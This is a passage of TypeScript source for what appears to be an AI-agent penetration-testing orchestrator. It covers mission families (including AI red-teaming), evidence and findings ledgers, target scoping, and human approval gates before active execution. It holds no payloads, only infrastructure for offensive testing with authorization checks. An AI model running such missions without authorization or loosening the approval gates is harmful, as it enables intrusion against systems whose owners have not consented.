    protected_metric: 'no secret values copied into reports or logs',
  },
  reporting_remediation: {
    nontechnical_clarity_floor: 0.86,
    acceptance_criteria_floor: 0.82,
    evidence_reference_floor: 0.9,
    protected_metric: 'claims link back to evidence or uncertainty',
  },
};

function currentMode(): TempestMode {
  return process.env.T3MP3ST_STATE_DIR || process.env.T3MP3ST_MODE === 't3mp3st' ? 't3mp3st' : 'standalone';
}

function stateRoot(): string {
  return process.env.T3MP3ST_STATE_DIR ||
    (process.env.T3MP3ST_STATE_DIR ? `${process.env.T3MP3ST_STATE_DIR}/organs/t3mp3st` : 'memory');
}

function stateFilePath(): string | null {
  const root = stateRoot();
  return root === 'memory' ? null : join(root, 'state.json');
}

function eventsFilePath(): string | null {
  const root = stateRoot();
  return root === 'memory' ? null : join(root, 'events.jsonl');
}

function nowIso(): string {
  return new Date().toISOString();
}

function newId(prefix: string): string {
  return `${prefix}_${randomUUID().slice(0, 8)}`;
}

function normalizeStringList(value: unknown): string[] {
  if (Array.isArray(value)) return value.map(String).filter(Boolean);
  if (typeof value === 'string' && value.trim()) return value.split(/[\n,]/).map(item => item.trim()).filter(Boolean);
  return [];
}

function normalizeResourceIds(value: unknown): string[] {
  const known = new Set(RESOURCE_PACKS.map(resource => resource.id));
  return normalizeStringList(value).filter(id => known.has(id));
}

function normalizeEvidenceType(value: unknown): EvidenceType {
  return ['artifact', 'command', 'log', 'receipt', 'report', 'screenshot', 'source', 'note'].includes(String(value))
    ? value as EvidenceType
    : 'note';
}

function normalizeEvidenceProvenanceStrength(value: unknown, fallback?: EvidenceProvenanceStrength): EvidenceProvenanceStrength {
  return ['weak', 'context', 'tool', 'replayable'].includes(String(value))
    ? value as EvidenceProvenanceStrength
    : fallback || 'weak';
}

function inferEvidenceProvenanceStrength(input: { type?: unknown; source?: unknown; command?: unknown; uri?: unknown }): EvidenceProvenanceStrength {
  const type = normalizeEvidenceType(input.type);
  const source = String(input.source || '');
  if (type === 'receipt' || type === 'screenshot') return 'replayable';
  if (type === 'command' || source === 'tool' || (typeof input.command === 'string' && input.command.trim())) return 'tool';
  if (type === 'artifact' || type === 'log' || type === 'source' || type === 'report' || (typeof input.uri === 'string' && input.uri.trim())) return 'context';
  return 'weak';
}

function evidenceStrengthRank(strength: EvidenceProvenanceStrength): number {
  return { weak: 0, context: 1, tool: 2, replayable: 3 }[strength] ?? 0;
}

function summarizeEvidenceProvenance(entries: EvidenceEntry[]): Record<EvidenceProvenanceStrength | 'strong', number> {
  const summary = { weak: 0, context: 0, tool: 0, replayable: 0, strong: 0 };
  for (const entry of entries) {
    const strength = entry.provenanceStrength || inferEvidenceProvenanceStrength(entry);
    summary[strength] += 1;
    if (evidenceStrengthRank(strength) >= evidenceStrengthRank('tool')) summary.strong += 1;
  }
  return summary;
}

function strongestEvidenceStrength(entries: EvidenceEntry[]): EvidenceProvenanceStrength {
  return entries.reduce<EvidenceProvenanceStrength>((strongest, entry) => {
    const strength = entry.provenanceStrength || inferEvidenceProvenanceStrength(entry);
    return evidenceStrengthRank(strength) > evidenceStrengthRank(strongest) ? strength : strongest;
  }, 'weak');
}

function normalizeSeverity(value: unknown): FindingSeverity {
  return ['info', 'low', 'medium', 'high', 'critical'].includes(String(value))
    ? value as FindingSeverity
    : 'medium';
}

function normalizeFindingStatus(value: unknown, fallback: FindingStatus): FindingStatus {
  return ['open', 'validated', 'false_positive', 'fix_ready', 'retest_queued', 'resolved'].includes(String(value))
    ? value as FindingStatus
    : fallback;
}

function normalizeRetestStatus(value: unknown, fallback: RetestStatus): RetestStatus {
  return ['queued', 'passed', 'failed', 'blocked'].includes(String(value))
    ? value as RetestStatus
    : fallback;
}

function normalizeHypothesisStatus(value: unknown, fallback: HypothesisStatus): HypothesisStatus {
  return ['open', 'testing', 'supported', 'weakened', 'promoted', 'rejected'].includes(String(value))
    ? value as HypothesisStatus
    : fallback;
}

function normalizeWorkOrderStatus(value: unknown, fallback: WorkOrderStatus): WorkOrderStatus {
  return ['queued', 'ready', 'needs_receipt', 'running', 'completed', 'blocked'].includes(String(value))
    ? value as WorkOrderStatus
    : fallback;
}

function normalizeWorkOrderKind(value: unknown, fallback: WorkOrderKind = 'prove'): WorkOrderKind {
  return ['prove', 'disprove', 'map_impact', 'owner_control', 'retest_design', 'tool_probe'].includes(String(value))
    ? value as WorkOrderKind
    : fallback;
}

function normalizeMemoryType(value: unknown): MemoryType {
  return ['identity', 'relationship', 'project', 'preference', 'procedure', 'boundary', 'open_question'].includes(String(value))
    ? value as MemoryType
    : 'procedure';
}

function normalizeMemoryStatus(value: unknown, fallback: MemoryProposalStatus): MemoryProposalStatus {
  return ['pending', 'accepted', 'rejected'].includes(String(value))
    ? value as MemoryProposalStatus
    : fallback;
}

function uniqueStrings(values: string[]): string[] {
  return [...new Set(values.filter(Boolean))];
}

function canonicalMemoryContent(content: string): string {
  return content.toLowerCase().replace(/\s+/g, ' ').trim();
}

function memoryFingerprint(type: MemoryType, content: string): string {
  return createHash('sha256')
    .update(`${type}\0${canonicalMemoryContent(content)}`)
    .digest('hex')
    .slice(0, 16);
}

function proposalFingerprint(proposal: MemoryProposal): string {
  return proposal.fingerprint || memoryFingerprint(proposal.type, proposal.content);
}

function entryFingerprint(entry: MemoryEntry): string {
  return entry.fingerprint || memoryFingerprint(entry.type, entry.content);
}

function clampConfidence(value: unknown): number {
  const numeric = Number(value);
  if (!Number.isFinite(numeric)) return 0.5;
  return Math.max(0, Math.min(1, numeric));
}

function normalizeMissionFamily(value: unknown, fallback: MissionFamily = 'web_api'): MissionFamily {
  const family = String(value || '');
  const families: MissionFamily[] = ['web_api', 'ai_red_team', 'cloud_infra', 'smart_contract', 'code_supply_chain', 'crypto_secrets', 'reverse_binary', 'agent_warfare', 'social_osint', 'reporting_remediation'];
  return families.includes(family as MissionFamily) ? family as MissionFamily : fallback;
}

function replaceMapContents<T extends { id: string }>(map: Map<string, T>, values: unknown): void {
  map.clear();
  if (!Array.isArray(values)) return;
  for (const value of values) {
    if (value && typeof value === 'object' && typeof (value as Record<string, unknown>).id === 'string') {
      map.set(String((value as Record<string, unknown>).id), value as T);
    }
  }
}

function buildStateSnapshot(): Record<string, unknown> {
  return {
    schema_version: 't3mp3st_state/v1',
    savedAt: nowIso(),
    mode: currentMode(),
    missionDrafts: [...missionDrafts.values()],
    improvementProposals: [...improvementProposals.values()],
    approvalRequests: [...approvalRequests.values()],
    evidenceLedger: [...evidenceLedger.values()],
    findingsLedger: [...findingsLedger.values()],
    retestLedger: [...retestLedger.values()],
    hypothesisLedger: [...hypothesisLedger.values()],
    workOrderLedger: [...workOrderLedger.values()],
    watchCycleLedger: [...watchCycleLedger.values()],
    memoryCapsule: [...memoryCapsule.values()],
    memoryProposals: [...memoryProposals.values()],
  };
}

async function persistState(reason = 'state.updated'): Promise<void> {
  const file = stateFilePath();
  if (!file) return;
  await mkdir(stateRoot(), { recursive: true });
  await writeFile(file, JSON.stringify(redactSecrets({ ...buildStateSnapshot(), reason }), null, 2));
}

// Debounced full-snapshot writer. persistState re-serializes the ENTIRE (growing) snapshot,
// so calling it on every contract event is O(n) write-amplification per event. This coalesces
// a burst into ONE trailing write per PERSIST_DEBOUNCE_MS. No data loss: the trailing write
// always captures the LATEST snapshot, and on a GRACEFUL shutdown flushPersist() (registered
// on SIGTERM/SIGINT at startup) synchronously writes any pending snapshot — so state.json is
// stale only on an ABRUPT (SIGKILL / power-loss) crash, same as the fs write was before.
const PERSIST_DEBOUNCE_MS = 1000;
let persistTimer: ReturnType<typeof setTimeout> | null = null;
let persistPending = false;
let persistReason = 'state.updated';
function schedulePersist(reason: string): void {
  persistPending = true;
  persistReason = reason;
  if (persistTimer) return; // a flush is already queued — it will capture the latest state
  persistTimer = setTimeout(() => {
    persistTimer = null;
    if (!persistPending) return;
    persistPending = false;
    void persistState(persistReason).catch(error => {
      console.warn(`[T3MP3ST] State persistence failed: ${error.message || error}`);
    });
  }, PERSIST_DEBOUNCE_MS);
}

// Flush any pending debounced snapshot NOW (used on graceful shutdown so the debounce window
// can't drop the last <1s of state on SIGTERM/SIGINT — Ctrl-C, docker stop, systemctl restart).
// state.json is the only restore source, so this closes the data-loss gap the debounce opened.
async function flushPersist(): Promise<void> {
  if (persistTimer) { clearTimeout(persistTimer); persistTimer = null; }
  if (persistPending) {
    persistPending = false;
    await persistState(persistReason);
  }
}

async function appendStateEvent(type: string, payload: Record<string, unknown>): Promise<void> {
  const file = eventsFilePath();
  if (!file) return;
  await mkdir(stateRoot(), { recursive: true });
  const event = redactSecrets({ ts: nowIso(), type, payload });
  await appendFile(file, `${JSON.stringify(event)}\n`);
}

async function loadPersistedState(): Promise<void> {
  const file = stateFilePath();
  if (!file) return;
  try {
    const raw = await readFile(file, 'utf8');
    const state = JSON.parse(raw) as Record<string, unknown>;
    replaceMapContents(missionDrafts, state.missionDrafts);
    replaceMapContents(improvementProposals, state.improvementProposals);
    replaceMapContents(approvalRequests, state.approvalRequests);
    replaceMapContents(evidenceLedger, state.evidenceLedger);
    replaceMapContents(findingsLedger, state.findingsLedger);
    replaceMapContents(retestLedger, state.retestLedger);
    replaceMapContents(hypothesisLedger, state.hypothesisLedger);
    replaceMapContents(workOrderLedger, state.workOrderLedger);
    replaceMapContents(watchCycleLedger, state.watchCycleLedger);
    replaceMapContents(memoryCapsule, state.memoryCapsule);
    replaceMapContents(memoryProposals, state.memoryProposals);
    console.log(`[T3MP3ST] State restored from ${file}`);
  } catch (error: any) {
    if (error?.code !== 'ENOENT') {
      console.warn(`[T3MP3ST] State restore skipped: ${error.message || error}`);
    }
  }
}

function normalizeTargetValue(value: unknown): string {
  if (typeof value === 'string' && value.trim()) return value.trim();
  if (value && typeof value === 'object') {
    const record = value as Record<string, unknown>;
    return String(record.host || record.locator || record.label || record.address || 'local-lab');
  }
  return 'local-lab';
}

function hostFromTarget(target: string): string {
  try {
    return new URL(target.includes('://') ? target : `http://${target}`).hostname.toLowerCase();
  } catch {
    return target.toLowerCase().replace(/\/.*$/, '');
  }
}

function isLocalOrPrivateTarget(target: string): boolean {
  const host = hostFromTarget(target);
  if (isLoopbackOrLabTarget(target)) return true;
  if (host.endsWith('.local')) return true;
  if (/^127\./.test(host) || /^10\./.test(host) || /^192\.168\./.test(host)) return true;
  const match = host.match(/^172\.(\d{1,2})\./);
  return Boolean(match && Number(match[1]) >= 16 && Number(match[1]) <= 31);
}

function isLoopbackOrLabTarget(target: string): boolean {
  const host = hostFromTarget(target);
  return !host || ['local-lab', 'localhost', '127.0.0.1', '::1', '[::1]', '0.0.0.0'].includes(host) || /^127\./.test(host);
}

function approvalIsFresh(approval: ApprovalRequest): boolean {
  if (approval.status !== 'approved') return false;
  if (!approval.expiresAt) return true;
  return Date.parse(approval.expiresAt) > Date.now();
}

function targetUsesWildcard(target: string): boolean {
  const raw = normalizeTargetValue(target).toLowerCase();
  if (raw === '*') return true;
  const withoutScheme = raw.replace(/^[a-z][a-z0-9+.-]*:\/\//, '');
  return withoutScheme.startsWith('*.') || hostFromTarget(raw).startsWith('*.');
}

function wildcardHostFromTarget(target: string): string {
  const raw = normalizeTargetValue(target).toLowerCase().replace(/^[a-z][a-z0-9+.-]*:\/\//, '');
  return raw.replace(/\/.*$/, '').replace(/:\d+$/, '');
}

function approvalMatches(approval: ApprovalRequest, action: GuardAction, target: string): boolean {
  if (approval.action !== action) return false;
  if (approval.target === '*') return action === 'model_call' || action === 'autonomous_execution';
  if (targetUsesWildcard(approval.target) && !approval.wildcardOptIn) return false;
  const approvalHost = targetUsesWildcard(approval.target) ? wildcardHostFromTarget(approval.target) : hostFromTarget(approval.target);
  const targetHost = hostFromTarget(target);
  if (approvalHost.startsWith('*.')) {
    const suffix = approvalHost.slice(1);
    return targetHost.endsWith(suffix) && targetHost !== approvalHost.slice(2);
  }
  return approvalHost === targetHost;
}

function ensureExecTargetsWithinApprovedTarget(targets: string[], approvedTarget: string): string[] {
  const approvedHost = hostFromTarget(normalizeTargetValue(approvedTarget));
  return targets
    .map(target => normalizeTargetValue(target))
    .filter(target => hostFromTarget(target) !== approvedHost);
}

function ensureExecTargetsAuthorized(
  targets: string[],
  approvedTarget: string,
  body: Record<string, unknown>,
): string[] {
  return ensureExecTargetsWithinApprovedTarget(targets, approvedTarget)
    .filter(target => !findApproval(body, 'autonomous_execution', target));
}

function approvalMatchesGateScope(approval: ApprovalRequest, action: GuardAction, operationId: string, target: string): boolean {
  if (!approvalMatches(approval, action, target)) return false;
  if (approval.operationId && operationId && approval.operationId !== operationId) return false;
  return true;
}

function findApproval(body: Record<string, unknown>, action: GuardAction, target: string): ApprovalRequest | null {
  const ids = [
    typeof body.approvalId === 'string' ? body.approvalId : '',
    ...(Array.isArray(body.approvalIds) ? body.approvalIds.filter((id): id is string => typeof id === 'string') : []),
  ].filter(Boolean);

  for (const id of ids) {
    const approval = approvalRequests.get(id);
    if (approval && approvalIsFresh(approval) && approvalMatches(approval, action, target)) return approval;
  }

  return null;
}

function createApprovalRequest(action: GuardAction, target: string, reason: string, body: Record<string, unknown>): ApprovalRequest {
  const operationDraft = body.operationDraft as Record<string, unknown> | undefined;
  const approval: ApprovalRequest = {
    id: newId('approval'),
    action,
    target,
    reason,
    status: 'pending',
    wildcardOptIn: body.allowWildcard === true && targetUsesWildcard(target),
    operationId: typeof operationDraft?.operation_id === 'string' ? operationDraft.operation_id : undefined,
    requestedBy: ['human', 'agent', 't3mp3st'].includes(String(body.source)) ? body.source as DraftSource : 'system',
    createdAt: nowIso(),
    updatedAt: nowIso(),
  };
  approvalRequests.set(approval.id, approval);
  emitContractEvent('approval.requested', { approvalId: approval.id, action, target, reason });
  return approval;
}

function operationAllowsLocalAction(body: Record<string, unknown>, action: GuardAction, target: string): boolean {
  const operationDraft = body.operationDraft as Record<string, any> | undefined;
  const scope = operationDraft?.scope as Record<string, any> | undefined;
  if (!operationDraft || !scope || scope.authorized !== true) return false;
  if (!isLocalOrPrivateTarget(target)) return false;
  if (['autonomous_execution', 'command_execution', 'network_request', 'mission_execution', 'model_call'].includes(action)) return false;
  const allowed = Array.isArray(scope.allowed_actions) ? scope.allowed_actions.map(String) : [];
  return allowed.includes(action) ||
    allowed.includes('active_testing') ||
    allowed.includes('read_only_assessment') ||
    allowed.includes('route_preview');
}

function guardAction(body: Record<string, unknown>, action: GuardAction, target: string, reason: string): { allowed: true; approval?: ApprovalRequest } | { allowed: false; approval: ApprovalRequest } {
  const approved = findApproval(body, action, target);
  if (approved) return { allowed: true, approval: approved };
  if (action !== 'autonomous_execution' && operationAllowsLocalAction(body, action, target)) return { allowed: true };
  if (action === 'network_request' && isLoopbackOrLabTarget(target)) return { allowed: true };
  return { allowed: false, approval: createApprovalRequest(action, target, reason, body) };
}

function blockForApproval(res: Response, guard: { allowed: false; approval: ApprovalRequest }): void {
  res.status(403).json({
    error: 'Approval required before active execution',
    approval: guard.approval,
    next: `POST /api/approvals/${guard.approval.id}/approve`,
  });
}

function routeFamilyForDraft(draft: MissionDraft): MissionFamily {
  const text = `${draft.title} ${draft.objective}`.toLowerCase();
  if (/(ai\s*red|red[-\s]?team|adversarial\s+ai|agent|prompt|model|rag|jailbreak|llm)/.test(text)) return 'ai_red_team';
  if (/(cloud|aws|gcp|azure|iam|container|kubernetes|ci\/cd|pipeline)/.test(text)) return 'cloud_infra';
  if (/(contract|solidity|token|defi|transaction|wallet)/.test(text)) return 'smart_contract';
  if (/(repo|dependency|secret|supply|code|github|gitlab)/.test(text)) return 'code_supply_chain';
  if (/(crypto|key|encoding|cipher|steg)/.test(text)) return 'crypto_secrets';
  if (/(binary|reverse|ctf|pwn|firmware)/.test(text)) return 'reverse_binary';
  if (/(osint|public|people|process|social)/.test(text)) return 'social_osint';
  if (/(web|api|http|owasp|endpoint|route|staging|owned app|application surface)/.test(text)) return 'web_api';
  if (/(report|remediation|executive|summary|fix plan)/.test(text)) return 'reporting_remediation';
  return 'web_api';
}

function familyOperators(family: MissionFamily): string[] {
  const map: Record<MissionFamily, string[]> = {
    web_api: ['coordinator', 'recon', 'scanner', 'analyst'],
    ai_red_team: ['coordinator', 'analyst', 'ghost'],
    cloud_infra: ['coordinator', 'recon', 'scanner', 'analyst'],
    smart_contract: ['coordinator', 'analyst'],
    code_supply_chain: ['coordinator', 'analyst', 'scanner'],
    crypto_secrets: ['analyst', 'ghost'],
    reverse_binary: ['analyst', 'scanner'],
    agent_warfare: ['coordinator', 'ghost', 'analyst'],
    social_osint: ['recon', 'analyst'],
    reporting_remediation: ['coordinator', 'analyst'],
  };
  return map[family];
}

// Per-lane tool loadout — the specialist's kit, derived from the catalog instead of a flat
// ['read','inspect','report'] for every lane. Command-ready (installable) tools sort first; the
// operator role selects the slice of its family's arsenal. This realises the "group of experts,
// each wielding their own tools" model. allowed_tools is advisory route-preview metadata (no
// runtime enforcement reads it), so this is a fidelity/intent upgrade with zero exec-path risk.
function laneToolGrants(family: MissionFamily, operator: string): string[] {
  const ranked = adaptersForFamily(family)
    .filter(a => a.execution !== 'catalog_only' && a.execution !== 'import_only')
    .sort((a, b) => (a.execution === 'safe_command' ? 0 : 1) - (b.execution === 'safe_command' ? 0 : 1));
  if (operator === 'coordinator') return ['read', 'report'];        // orchestrates; holds no scanners
  let domain: typeof ranked;
  switch (operator) {
    case 'recon':   domain = ranked.filter(a => a.networked); break;
    case 'scanner': domain = ranked.filter(a => a.networked && (a.execution === 'safe_command' || a.execution === 'receipt_required')); break;
    case 'ghost':   domain = ranked.filter(a => !a.networked || a.risk === 'passive'); break;
    case 'analyst': default: domain = ranked; break;                // the analyst wields the family's full kit
  }
  if (domain.length === 0) domain = ranked;                         // never leave an expert unarmed
  return uniqueStrings(['read', ...domain.slice(0, 6).map(a => a.binary), 'inspect', 'report']);
}

function operationModeForDraft(draft: MissionDraft): OperationMode {
  if (draft.status === 'archived') return 'review_only';
  if (draft.opsecPreference === 'ghost') return 'review_only';
  if (draft.source === 'agent') return 'agent_harness';
  return 'wizard';
}

function buildRoutePreview(draft: MissionDraft): RoutePreview {
  const family = routeFamilyForDraft(draft);
  const targets = draft.scope.length ? draft.scope : ['local-lab'];
  const requiresApproval = draft.opsecPreference === 'ghost' || draft.urgency === 'critical'
    ? ['human_approval_for_external_actions', 's3r4ph1m_scope_review']
    : ['s3r4ph1m_scope_review'];
  const warnings = draft.scope.length ? [] : ['No explicit target scope supplied; defaulting to local-lab draft mode.'];
  const opsecLevel = draft.opsecPreference === 'overt' ? 'loud' : draft.opsecPreference === 'normal' ? 'covert' : 'silent';
  const missionName = draft.title || `T3MP3ST ${family.replace(/_/g, ' ')}`;

  return {
    draftId: draft.id,
    route: {
      family,
      missionName,
      targets,
      operators: familyOperators(family),
      opsecLevel,
      objectives: [draft.objective].filter(Boolean),
      phases: ['scope_review', 'route_preview', 'evidence_plan', 'execution_ready', 'reporting'],
      requiresApproval,
      warnings,
    },
    operationDraft: {
      schema_version: 't3mp3st_operation/v1',
      operation_id: `op-${draft.id.replace(/^draft_/, '')}`,
      mission_id: draft.id,
      family,
      mode: operationModeForDraft(draft),
      target: {
        kind: draft.scope.length ? 'documented_asset' : 'local_range',
        label: targets[0],
        locator: targets[0],
      },
      scope: {
        authorized: false,
        allowed_actions: ['route_preview', 'evidence_planning', 'report_draft'],
        forbidden_actions: normalizeStringList(draft.constraints),
        egress_policy: 'review_before_network',
      },
      lanes: familyOperators(family).map((operator, index) => ({
        id: `lane-${index + 1}`,
        operator,
        engine: operator === 'analyst' ? 'codex' : operator === 'ghost' ? 'hermes' : 't3mp3st',
        purpose: `${operator} lane for ${family.replace(/_/g, ' ')}`,
        allowed_tools: laneToolGrants(family, operator),
      })),
      validation: {
        crucible: 'optional',
        replay_required: false,
      },
      knowledge_context: {
        resource_packs: resourcesForFamily(family).map(resource => ({
          id: resource.id,
          title: resource.title,
          authority: resource.authority,
          url: resource.url,
          use_when: resource.useWhen,
          caution: resource.caution,
        })),
        agent_prompt_packs: promptPacksForFamily(family).map(pack => ({
          id: pack.id,
          title: pack.title,
          role_frame: pack.roleFrame,
          evidence_contract: pack.evidenceContract,
        })),
        operator_runbook: runbookForFamily(family)?.title || null,
        context_policy: 'Use these sources for taxonomy, prioritization, evidence naming, and reporting context. They are not authorization or proof.',
      },
      evidence_gates: ['scope_receipt', 'artifact_or_log', 'false_positive_review', 'report_traceability'],
      reporting: {
        audience: 'engineering',
        outputs: ['mission_brief', 'findings_table', 'technical_appendix', 'ledger', 'fix_plan'],
      },
    },
  };
}

function buildMissionBundle(params: { draft?: MissionDraft; operationDraft?: Record<string, unknown>; preflight?: Record<string, unknown> }): Record<string, unknown> {
  const operationDraft = params.operationDraft || {};
  const draft = params.draft;
  const fallbackFamily = draft ? routeFamilyForDraft(draft) : 'web_api';
  const family = normalizeMissionFamily(operationDraft.family, fallbackFamily);
  const missionId = draft?.id || (typeof operationDraft.mission_id === 'string' ? operationDraft.mission_id : undefined);
  const operationId = typeof operationDraft.operation_id === 'string' ? operationDraft.operation_id : undefined;
  const runbook = runbookForFamily(family) || runbookForFamily('reporting_remediation');
  const resources = resourcesForFamily(family);
  const promptPacks = promptPacksForFamily(family);
  const evidence = [...evidenceLedger.values()].filter(entry =>
    (missionId && entry.missionId === missionId) || (operationId && entry.operationId === operationId)
  );
  const findings = [...findingsLedger.values()].filter(finding =>
    (missionId && finding.missionId === missionId) || (operationId && finding.operationId === operationId)
  );
  const hypotheses = scopedHypotheses(missionId || '', operationId || '');
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(missionId || '', operationId || '')
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) || (missionId && retest.missionId === missionId) || (operationId && retest.operationId === operationId)
  );
  const approvals = [...approvalRequests.values()].filter(approval =>
    (operationId && approval.operationId === operationId) ||
    (operationDraft.target && typeof operationDraft.target === 'object' && approval.target === normalizeTargetValue(operationDraft.target))
  );
  const findingsWithoutEvidence = findings.filter(finding => finding.evidenceIds.length === 0).map(finding => finding.id);
  const findingsWithoutRetest = findings.filter(finding => finding.retestIds.length === 0).map(finding => finding.id);
  const hypothesesWithoutEvidence = hypotheses.filter(hypothesis => !hypothesis.evidenceForIds.length && !hypothesis.evidenceAgainstIds.length).map(hypothesis => hypothesis.id);
  const openWorkOrders = workOrders.filter(order => !['completed', 'blocked'].includes(order.status)).map(order => order.id);
  const unresolvedRetests = retests.filter(retest => retest.status !== 'passed').map(retest => retest.id);
  const evidenceGaps = [
    !missionId ? 'mission_id_missing' : '',
    !operationId ? 'operation_id_missing' : '',
    evidence.length === 0 ? 'no_evidence_logged' : '',
    hypothesesWithoutEvidence.length ? `hypotheses_without_evidence:${hypothesesWithoutEvidence.join(',')}` : '',
    openWorkOrders.length ? `open_work_orders:${openWorkOrders.join(',')}` : '',
    findingsWithoutEvidence.length ? `findings_without_evidence:${findingsWithoutEvidence.join(',')}` : '',
    findingsWithoutRetest.length ? `findings_without_retest:${findingsWithoutRetest.join(',')}` : '',
    unresolvedRetests.length ? `unresolved_retests:${unresolvedRetests.join(',')}` : '',
    promptPacks.length === 0 ? 'no_prompt_pack_for_family' : '',
  ].filter(Boolean);
  const computedNextActions = [
    evidence.length === 0 ? 'Log at least one scope or artifact evidence entry.' : '',
    hypothesesWithoutEvidence.length ? 'Attach evidence for or against every active hypothesis.' : '',
    openWorkOrders.length ? 'Complete or block queued work orders before final reporting.' : '',
    findingsWithoutEvidence.length ? 'Attach evidence to every finding before reporting.' : '',
    findingsWithoutRetest.length ? 'Queue retests for every validated finding.' : '',
    unresolvedRetests.length ? 'Complete queued retests and update finding status.' : '',
    approvals.length === 0 ? 'Request approval receipt before active execution.' : '',
  ].filter(Boolean);
  const reproPacks = buildReproPacks({ missionId, operationId, family, operationDraft });
  const pressurePaths = buildPressurePaths({ missionId, operationId, family, operationDraft, reproPacks });

  return redactSecrets({
    schema_version: 't3mp3st_mission_bundle/v1',
    generatedAt: nowIso(),
    family,
    missionId: missionId || null,
    operationId: operationId || null,
    draft: draft || null,
    operationDraft,
    preflight: params.preflight || null,
    doctrine: {
      endpoint: '/api/operator-doctrine',
      principle: 'authority lives in scope receipts, capability grants, tool permissions, logs, provenance, and retests',
    },
    runbook,
    promptPacks,
    resources,
    ledgers: {
      evidence,
      hypotheses,
      workOrders,
      findings,
      retests,
      approvals,
    },
    missionSummary: {
      laneSummary: missionLaneSummary({ hypotheses, workOrders, findings, retests }),
      primaryFamily: family,
      evidenceProvenance: summarizeEvidenceProvenance(evidence),
      reproReadiness: { ...(reproPacks.summary || {}) },
      pressureReadiness: { ...(pressurePaths.summary || {}) },
    },
    reproPacks,
    pressurePaths,
    evidenceGaps,
    nextActions: [...new Set([...(runbook?.nextBestActions || []), ...computedNextActions])],
    handoff: {
      humanSummary: evidenceGaps.length
        ? `Mission bundle has ${evidenceGaps.length} evidence/control gaps before hard claims.`
        : 'Mission bundle is traceable: evidence, findings, and retests are linked.',
      agentInstructions: [
        'Do not treat resource packs or prompt packs as authorization.',
        'Continue from the mission contract and approval receipts.',
        'Turn claims into findings only when evidence and retest criteria are attached.',
      ],
    },
  }) as Record<string, unknown>;
}

function buildMissionGate(operationDraft: Record<string, unknown>): Record<string, unknown> {
  const family = normalizeMissionFamily(operationDraft.family, 'web_api');
  const missionId = typeof operationDraft.mission_id === 'string' ? operationDraft.mission_id : '';
  const operationId = typeof operationDraft.operation_id === 'string' ? operationDraft.operation_id : '';
  const target = normalizeTargetValue(operationDraft.target);
  const scope = operationDraft.scope && typeof operationDraft.scope === 'object' ? operationDraft.scope as Record<string, unknown> : {};
  const clientScopeAuthorized = scope.authorized === true;
  const evidence = [...evidenceLedger.values()].filter(entry =>
    (missionId && entry.missionId === missionId) || (operationId && entry.operationId === operationId)
  );
  const findings = [...findingsLedger.values()].filter(finding =>
    (missionId && finding.missionId === missionId) || (operationId && finding.operationId === operationId)
  );
  const evidenceProvenance = summarizeEvidenceProvenance(evidence);
  const strongEvidenceIds = new Set(
    evidence
      .filter(entry => evidenceStrengthRank(entry.provenanceStrength || inferEvidenceProvenanceStrength(entry)) >= evidenceStrengthRank('tool'))
      .map(entry => entry.id)
  );
  const hypotheses = scopedHypotheses(missionId, operationId);
  const routeFamilyHypotheses = scopedHypotheses(missionId, operationId, family);
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(missionId, operationId)
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const openWorkOrders = workOrders.filter(order => !['completed', 'blocked'].includes(order.status));
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) || (missionId && retest.missionId === missionId) || (operationId && retest.operationId === operationId)
  );
  const findingsWithoutRetest = findings.filter(finding => finding.retestIds.length === 0);
  const findingsWithoutStrongEvidence = findings.filter(finding => !finding.evidenceIds.some(evidenceId => strongEvidenceIds.has(evidenceId)));
  const unresolvedRetests = retests.filter(retest => retest.status !== 'passed');
  const approvals = [...approvalRequests.values()].filter(approval =>
    approvalMatchesGateScope(approval, 'mission_execution', operationId, target) ||
    approvalMatchesGateScope(approval, 'command_execution', operationId, target)
  );
  const freshApprovals = approvals.filter(approvalIsFresh);
  const freshMissionApprovals = freshApprovals.filter(approval =>
    approvalMatchesGateScope(approval, 'mission_execution', operationId, target)
  );
  const freshCommandApprovals = freshApprovals.filter(approval => approvalMatchesGateScope(approval, 'command_execution', operationId, target));
  const laneSummary = missionLaneSummary({ hypotheses, workOrders, findings, retests });
  const activeLaneCount = laneSummary.filter(lane => lane.hypotheses || lane.workOrders || lane.findings || lane.retests).length;
  const promptPacks = promptPacksForFamily(family);
  const runbook = runbookForFamily(family);
  const checks = [
    {
      id: 'target_scope',
      label: 'Target scope',
      status: target && target !== 'undefined' ? 'ok' : 'block',
      detail: target || 'No target locator in operation draft.',
    },
    {
      id: 'authorization',
      label: 'Authorization',
      status: freshMissionApprovals.length ? 'ok' : 'warn',
      detail: freshMissionApprovals.length
          ? `${freshMissionApprovals.length} fresh mission receipt(s)`
          : clientScopeAuthorized
            ? 'Client draft claims authorization; server-side mission receipt still required.'
          : freshCommandApprovals.length
            ? `${freshCommandApprovals.length} command receipt(s), but mission receipt still needed.`
            : 'Receipt needed before active execution.',
    },
    {
      id: 'prompt_pack',
      label: 'Prompt pack',
      status: promptPacks.length ? 'ok' : 'block',
      detail: promptPacks.map(pack => pack.id).join(', ') || 'No prompt pack for family.',
    },
    {
      id: 'runbook',
      label: 'Operator runbook',
      status: runbook ? 'ok' : 'warn',
      detail: runbook?.title || 'No runbook for family.',
    },
    {
      id: 'evidence',
      label: 'Evidence ledger',
      status: evidence.length && evidenceProvenance.strong ? 'ok' : 'warn',
      detail: `${evidence.length} evidence item(s): ${evidenceProvenance.strong} strong, ${evidenceProvenance.context} context, ${evidenceProvenance.weak} weak`,
    },
    {
      id: 'claim_hardening',
      label: 'Claim hardening',
      status: hypotheses.length && findings.length ? 'ok' : 'warn',
      detail: `${hypotheses.length} mission hypothesis item(s) across ${activeLaneCount || 0} lane(s), ${routeFamilyHypotheses.length} in route family, ${findings.length} finding(s)`,
    },
    {
      id: 'findings',
      label: 'Finding linkage',
      status: findings.every(finding => finding.evidenceIds.length > 0) && !findingsWithoutStrongEvidence.length ? 'ok' : 'warn',
      detail: `${findings.length} finding(s), ${findings.filter(finding => finding.evidenceIds.length === 0).length} without evidence, ${findingsWithoutStrongEvidence.length} without strong evidence`,
    },
    {
      id: 'hunt_queue',
      label: 'Hunt queue',
